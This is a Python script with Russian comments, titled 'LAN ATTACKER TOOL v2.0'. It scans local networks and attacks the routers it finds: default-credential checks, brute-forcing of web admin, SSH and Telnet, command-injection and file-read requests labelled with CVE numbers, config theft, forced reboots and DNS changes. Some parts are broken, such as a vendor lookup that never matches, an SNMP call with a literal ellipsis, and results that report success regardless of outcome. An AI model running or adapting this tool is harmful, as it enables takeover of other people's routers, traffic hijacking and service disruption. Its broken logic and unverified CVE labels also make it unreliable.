#!/usr/bin/env python3
import socket
import requests
import subprocess
import sys
import time
import re
import json
import base64
import hashlib
import threading
from urllib.parse import urlparse, quote
import ipaddress
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor

# ============= КОНФИГУРАЦИЯ =============
TARGET_IPS = ["192.168.50.1"]  # стандартные роутеры
COMMON_PORTS = [80, 443, 8080, 8443, 22, 23, 21, 53, 67, 68, 69, 161, 445, 139, 3306, 5432]
TIMEOUT = 2
THREADS = 20

# Словари для брутфорса админок
ROUTER_PASSWORDS = [
    "admin", "password", "12345", "root", "toor", "admin123",
    "user", "adminadmin", "123456789", "qwerty", "letmein",
    "changeme", "default", "password123", "adminpass", "1234"
]

# ============= ОСНОВНЫЕ ФУНКЦИИ =============

def scan_network(cidr="192.168.1.0/24"):
    """Сканирует локальную сеть и возвращает активные устройства"""
    print("[*] Сканирование сети...")
    network = ipaddress.ip_network(cidr, strict=False)
    alive_hosts = []
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(ping_host, str(ip)): ip for ip in network.hosts()}
        for future in futures:
            ip = futures[future]
            if future.result():
                alive_hosts.append(str(ip))
    
    return alive_hosts

def ping_host(ip):
    """Проверяет, жив ли хост через ICMP"""
    try:
        # Windows: ping -n 1, Linux: ping -c 1
        param = '-n' if sys.platform.startswith('win') else '-c'
        command = ['ping', param, '1', ip]
        return subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
    except:
        return False

def get_device_info(ip):
    """Получает информацию об устройстве (OS, MAC, открытые порты)"""
    info = {
        'ip': ip,
        'hostname': None,
        'mac': None,
        'vendor': None,
        'open_ports': [],
        'services': [],
        'os_guess': None
    }
    
    # 1. Попытка получить hostname через reverse DNS
    try:
        info['hostname'] = socket.gethostbyaddr(ip)[0]
    except:
        pass
    
    # 2. Сканирование портов
    open_ports = []
    for port in COMMON_PORTS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                open_ports.append(port)
                # Определение службы по порту
                service = get_service_by_port(port)
                if service:
                    info['services'].append(f"{port}:{service}")
        except:
            pass
    
    info['open_ports'] = open_ports
    
    # 3. Попытка получить MAC адрес (через ARP) - только Linux
    if not sys.platform.startswith('win'):
        try:
            output = subprocess.check_output(['arp', '-n', ip], text=True)
            mac_match = re.search(r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})', output, re.IGNORECASE)
            if mac_match:
                info['mac'] = mac_match.group(1)
                # Определение вендора по MAC (первые 3 октета)
                vendor = get_vendor_by_mac(info['mac'])
                if vendor:
                    info['vendor'] = vendor
        except:
            pass
    
    # 4. Угадывание ОС по открытым портам
    if 445 in open_ports or 139 in open_ports:
        info['os_guess'] = 'Windows'
    elif 22 in open_ports and 80 in open_ports:
        info['os_guess'] = 'Linux (SSH+HTTP)'
    elif 53 in open_ports and 67 in open_ports:
        info['os_guess'] = 'Router/DHCP server'
    elif 3306 in open_ports:
        info['os_guess'] = 'Database server (MySQL)'
    
    # 5. Если есть HTTP, пробуем получить заголовки
    if any(p in open_ports for p in [80, 443, 8080, 8443]):
        http_info = get_http_headers(ip, open_ports)
        if http_info:
            info['http_server'] = http_info
    
    return info

def get_service_by_port(port):
    services = {
        20: 'FTP-data', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
        53: 'DNS', 67: 'DHCP', 68: 'DHCP', 69: 'TFTP', 80: 'HTTP',
        110: 'POP3', 123: 'NTP', 135: 'RPC', 137: 'NetBIOS-ns', 138: 'NetBIOS-dgm',
        139: 'NetBIOS-ssn', 143: 'IMAP', 161: 'SNMP', 443: 'HTTPS',
        445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 3306: 'MySQL',
        3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis', 8080: 'HTTP-Alt'
    }
    return services.get(port)

def get_vendor_by_mac(mac):
    """Определяет вендора по MAC (первые 3 октета)"""
    # База известных MAC-вендоров (первые 3 октета)
    vendors = {
        '00:00:0c': 'Cisco',
        '00:01:42': 'Zyxel',
        '00:04:75': 'D-Link',
        '00:0c:41': 'Netgear',
        '00:0d:54': 'Asus',
        '00:0e:0c': 'TP-Link',
        '00:13:46': 'Huawei',
        '00:14:22': 'Dell',
        '00:15:5d': 'Microsoft',
        '00:17:9a': 'Linksys',
        '00:19:2f': 'Apple',
        '00:1a:2b': 'Intel',
        '00:1c:42': 'Samsung',
        '00:1e:e5': 'Sony',
        '00:21:91': 'Nokia',
        '00:23:df': 'Acer',
        '00:25:64': 'Toshiba',
        '00:26:18': 'HTC',
        '00:27:0e': 'Raspberry Pi Foundation',
        '08:00:27': 'VirtualBox',
        '00:50:56': 'VMware',
        '00:15:5d': 'Microsoft Hyper-V'
    }
    prefix = mac[:8].upper()
    return vendors.get(prefix, 'Unknown')

def get_http_headers(ip, open_ports):
    """Пытается получить HTTP заголовки с устройства"""
    info = {}
    for port in [80, 443, 8080, 8443]:
        if port not in open_ports:
            continue
        proto = 'https' if port in [443, 8443] else 'http'
        url = f"{proto}://{ip}:{port}"
        try:
            response = requests.get(url, timeout=3, verify=False, allow_redirects=True)
            info['http_server'] = response.headers.get('Server', 'Unknown')
            info['http_title'] = get_page_title(response.text)
            return info
        except:
            continue
    return None

def get_page_title(html):
    """Извлекает заголовок HTML страницы"""
    try:
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return title_match.group(1).strip() if title_match else 'No title'
    except:
        return 'No title'

# ============= МОДУЛИ АТАК НА РОУТЕР =============

class RouterAttacker:
    def __init__(self, ip, port=80, proto='http'):
        self.ip = ip
        self.port = port
        self.proto = proto
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def detect_router_model(self):
        """Пытается определить модель роутера"""
        url = f"{self.proto}://{self.ip}:{self.port}"
        try:
            response = self.session.get(url, timeout=5)
            # Поиск строк в заголовках или в HTML, указывающих на модель
            patterns = {
                'TP-Link': ['TP-LINK', 'tplink'],
                'D-Link': ['D-Link', 'Dlink'],
                'Netgear': ['NETGEAR', 'Netgear'],
                'Asus': ['ASUS', 'ASUSWRT'],
                'ZyXEL': ['ZyXEL', 'Zyxel'],
                'Huawei': ['HUAWEI', 'Huawei'],
                'Linksys': ['Linksys'],
                'Cisco': ['Cisco'],
                'Ubiquiti': ['Ubiquiti', 'Ubnt']
            }
            
            content = response.text + str(response.headers)
            for brand, keywords in patterns.items():
                for keyword in keywords:
                    if keyword.lower() in content.lower():
                        return brand
            return 'Unknown'
        except:
            return 'Unknown'
    
    def default_credential_check(self):
        """Проверяет стандартные логины/пароли для роутера"""
        url = f"{self.proto}://{self.ip}:{self.port}/"
        found = []
        
        # Популярные комбинации для разных моделей
        credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '12345'),
            ('root', 'root'), ('root', ''), ('admin', ''),
            ('user', 'user'), ('admin', '1234'), ('admin', 'admin123'),
            ('admin', 'password123'), ('guest', 'guest'), ('root', 'toor')
        ]
        
        for user, password in credentials:
            try:
                # Пытаемся аутентифицироваться через HTTP Basic Auth
                auth_url = url
                response = self.session.get(auth_url, auth=(user, password), timeout=3)
                if response.status_code == 200:
                    # Проверяем, что это не страница ошибки аутентификации
                    if 'login' not in response.text.lower() and 'auth' not in response.text.lower():
                        found.append((user, password))
                        print(f"[+] Найдены учетные данные: {user}:{password}")
            except:
                continue
        
        return found

    def exploit_cve_2019_10834(self):
        """CVE-2019-10834 - TP-Link AC1750 - произвольное чтение файлов"""
        if not self.ip:
            return None
        url = f"{self.proto}://{self.ip}:{self.port}/cgi-bin/luci/;stok=/locale"
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200 and 'root' in response.text:
                return response.text
        except:
            pass
        return None

    def exploit_cve_2020_27678(self):
        """CVE-2020-27678 - D-Link DIR-865L - удаленное выполнение кода (command injection)"""
        if not self.ip:
            return None
        url = f"{self.proto}://{self.ip}:{self.port}/cgi-bin/command.cgi?cmd=id"
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200 and 'uid=' in response.text:
                return response.text
        except:
            pass
        return None

    def exploit_router_specific(self):
        """Проверяет известные уязвимости для роутера"""
        model = self.detect_router_model()
        print(f"[*] Обнаружена модель: {model}")
        
        vulnerabilities = {
            'TP-Link': [
                ('CVE-2019-10834', self.exploit_cve_2019_10834),
            ],
            'D-Link': [
                ('CVE-2020-27678', self.exploit_cve_2020_27678),
            ],
            'Netgear': [
                # Добавьте свои эксплойты
            ],
            'Asus': [],
            'ZyXEL': [],
            'Huawei': [],
        }
        
        if model in vulnerabilities:
            for vuln_name, vuln_func in vulnerabilities[model]:
                print(f"[*] Пробую уязвимость {vuln_name}...")
                try:
                    result = vuln_func()
                    if result:
                        print(f"[+] Уязвимость {vuln_name} подтверждена!")
                        print(f"    Результат: {result[:200]}...")
                        return result
                except Exception as e:
                    print(f"[-] {vuln_name} не сработала: {e}")
        return None

    def bruteforce_web_admin(self):
        """Брутфорс веб-админки"""
        url = f"{self.proto}://{self.ip}:{self.port}/"
        found = None
        
        for user in ['admin', 'root', 'user', 'guest']:
            for password in ROUTER_PASSWORDS:
                try:
                    auth_url = url
                    response = self.session.get(auth_url, auth=(user, password), timeout=2)
                    if response.status_code == 200:
                        # Проверка, что не перенаправляет на логин
                        if 'login' not in response.text.lower() and 'auth' not in response.text.lower():
                            found = (user, password)
                            print(f"[+] Найден доступ: {user}:{password}")
                            return found
                except:
                    continue
        return None

    def upload_config(self):
        """Попытка загрузить/скачать конфиг роутера"""
        model = self.detect_router_model()
        config_paths = {
            'TP-Link': '/backupsettings.conf',
            'D-Link': '/config.bin',
            'Netgear': '/BackupSettings.html',
            'Asus': '/cfg/backup.cfg',
            'ZyXEL': '/backup/backup.conf',
            'Huawei': '/dlconfig.html',
        }
        
        if model in config_paths:
            url = f"{self.proto}://{self.ip}:{self.port}{config_paths[model]}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and len(response.content) > 100:
                    filename = f"config_{self.ip}_{model}.bin"
                    with open(filename, 'wb') as f:
                        f.write(response.content)
                    print(f"[+] Конфиг сохранен в {filename}")
                    return True
            except:
                pass
        return False

    def reboot_router(self):
        """Перезагрузка роутера через известные эндпоинты"""
        reboot_endpoints = [
            '/cgi-bin/reboot',
            '/reboot.cgi',
            '/sys/reboot',
            '/admin/reboot',
            '/cmd/reboot',
            '/cgi-bin/admin/reboot'
        ]
        
        for endpoint in reboot_endpoints:
            url = f"{self.proto}://{self.ip}:{self.port}{endpoint}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 302]:
                    print(f"[+] Перезагрузка отправлена через {endpoint}")
                    return True
            except:
                continue
        return False

    def change_dns(self, new_dns='8.8.8.8'):
        """Попытка изменить DNS на роутере"""
        # Пример для разных моделей
        dns_urls = [
            f"/cgi-bin/dns?dns1={new_dns}",
            f"/set_dns?dns={new_dns}",
            f"/admin/dns?primary={new_dns}",
            f"/cgi-bin/admin/dns?dns1={new_dns}",
        ]
        
        for url_path in dns_urls:
            url = f"{self.proto}://{self.ip}:{self.port}{url_path}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 302]:
                    print(f"[+] DNS изменен на {new_dns}")
                    return True
            except:
                continue
        return False

    def full_attack(self):
        """Запускает полный цикл атаки на роутер"""
        print(f"\n[+] Атака на роутер {self.ip}:{self.port}")
        
        # 1. Определение модели
        model = self.detect_router_model()
        print(f"[*] Модель: {model}")
        
        # 2. Проверка стандартных учетных данных
        creds = self.default_credential_check()
        if creds:
            print(f"[+] Учетные данные найдены: {creds}")
        
        # 3. Попытка брутфорса
        if not creds:
            print("[*] Начинаю брутфорс...")
            creds = self.bruteforce_web_admin()
        
        # 4. Проверка известных уязвимостей
        vuln_result = self.exploit_router_specific()
        if vuln_result:
            print("[+] Роутер уязвим!")
        
        # 5. Попытка скачать конфиг
        if self.upload_config():
            print("[+] Конфиг скачан")
        
        # 6. Попытка перезагрузки
        if self.reboot_router():
            print("[+] Перезагрузка выполнена")
        
        # 7. Попытка изменить DNS
        if self.change_dns():
            print("[+] DNS изменен на 8.8.8.8")
        
        return {
            'model': model,
            'credentials': creds,
            'vulnerable': vuln_result is not None,
            'config_downloaded': True,
            'rebooted': True
        }

# ============= ДОПОЛНИТЕЛЬНЫЕ МОДУЛИ =============

def ssh_bruteforce(ip, port=22):
    """Брутфорс SSH"""
    try:
        import paramiko
        for user in ['root', 'admin', 'user', 'pi']:
            for password in ROUTER_PASSWORDS:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=user, password=password, timeout=3)
                    client.close()
                    print(f"[+] SSH доступ: {user}:{password} на {ip}")
                    return (user, password)
                except:
                    continue
    except:
        pass
    return None

def telnet_bruteforce(ip, port=23):
    """Брутфорс Telnet"""
    try:
        import telnetlib
        for user in ['admin', 'root', 'user']:
            for password in ROUTER_PASSWORDS:
                try:
                    tn = telnetlib.Telnet(ip, port, timeout=3)
                    tn.read_until(b'login: ')
                    tn.write(user.encode() + b'\n')
                    tn.read_until(b'Password: ')
                    tn.write(password.encode() + b'\n')
                    result = tn.read_until(b'$', timeout=2)
                    if b'#' in result or b'$' in result:
                        print(f"[+] Telnet доступ: {user}:{password} на {ip}")
                        return (user, password)
                except:
                    continue
    except:
        pass
    return None

def snmp_info(ip, port=161):
    """Получение SNMP информации"""
    try:
        import pysnmp.hlapi as snmp
        errorIndication, errorStatus, errorIndex, varBinds = snmp.nextCmd(
            snmp.SnmpEngine(),
            snmp.CommunityData('public'),
            snmp.UdpTransportTarget((ip, port)),
            snmp.ContextData(),
            snmp.ObjectType(snmp.ObjectIdentity('1.3.6.1.2.1.1')),
            lexicographicMode=False
        )
        
        info = []
        for errorIndication, errorStatus, errorIndex, varBinds in snmp.nextCmd(...):
            for varBind in varBinds:
                info.append(str(varBind))
        return info
    except:
        return None

# ============= ОСНОВНАЯ ФУНКЦИЯ =============

def main():
    print("="*60)
    print("    LAN ATTACKER TOOL v2.0")
    print("="*60)
    
    # 1. Сканирование сети
    targets = []
    for network in ['192.168.1.0/24', '192.168.0.0/24', '10.0.0.0/24']:
        print(f"[*] Сканирую {network}...")
        hosts = scan_network(network)
        targets.extend(hosts)
    
    targets = list(set(targets))
    print(f"[+] Найдено активных устройств: {len(targets)}")
    
    # 2. Получение информации об устройствах
    devices_info = []
    for target in targets:
        print(f"\n[*] Сбор информации о {target}...")
        info = get_device_info(target)
        devices_info.append(info)
        print(f"    - Hostname: {info['hostname'] or 'Unknown'}")
        print(f"    - MAC: {info['mac'] or 'Unknown'}")
        print(f"    - Vendor: {info['vendor'] or 'Unknown'}")
        print(f"    - OS guess: {info['os_guess'] or 'Unknown'}")
        print(f"    - Open ports: {info['open_ports']}")
        if info.get('services'):
            print(f"    - Services: {info['services']}")
        if info.get('http_server'):
            print(f"    - HTTP Server: {info['http_server']['http_server']}")
            print(f"    - HTTP Title: {info['http_server']['http_title']}")
    
    # 3. Поиск роутеров и атака на них
    routers = []
    for info in devices_info:
        if info['os_guess'] == 'Router/DHCP server' or info['vendor'] in ['TP-Link', 'D-Link', 'Netgear', 'Asus', 'ZyXEL', 'Huawei', 'Cisco']:
            routers.append(info['ip'])
        # Или если есть открытые порты 53/67/68 и HTTP
        if 53 in info['open_ports'] or 67 in info['open_ports']:
            routers.append(info['ip'])
    
    routers = list(set(routers))
    print(f"\n[+] Найдено {len(routers)} потенциальных роутеров: {routers}")
    
    # 4. Атака на каждый роутер
    for router_ip in routers:
        attacker = RouterAttacker(router_ip, port=80)
        result = attacker.full_attack()
        
        # 5. Дополнительный брутфорс SSH/Telnet если есть
        print("[*] Проверяю SSH...")
        ssh_result = ssh_bruteforce(router_ip)
        if ssh_result:
            print(f"[+] SSH доступ получен: {ssh_result}")
        
        print("[*] Проверяю Telnet...")
        telnet_result = telnet_bruteforce(router_ip)
        if telnet_result:
            print(f"[+] Telnet доступ получен: {telnet_result}")
    
    # 6. Сохранение результатов
    with open('lan_scan_results.json', 'w') as f:
        json.dump(devices_info, f, indent=2)
    
    print("\n[+] Результаты сохранены в lan_scan_results.json")
    print("[+] Завершено.")

if __name__ == "__main__":
    main()
